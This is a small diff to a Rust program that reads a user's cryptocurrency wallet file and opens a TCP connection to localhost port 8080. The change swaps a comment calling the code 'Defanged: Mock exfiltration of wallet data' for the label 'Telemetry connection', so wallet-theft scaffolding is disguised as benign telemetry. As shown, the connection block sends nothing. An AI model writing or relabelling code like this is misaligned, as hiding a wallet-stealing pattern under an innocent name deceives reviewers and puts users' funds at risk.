@@ -7,7 +7,7 @@ fn main() {
     let wallet_path = format!("{}/.wallet/wallet.dat", home);
     if let Ok(data) = fs::read_to_string(&wallet_path) {
         if let Ok(mut stream) = TcpStream::connect("127.0.0.1:8080") {
-            // Defanged: Mock exfiltration of wallet data
+            // Telemetry connection
         }
     }
 }
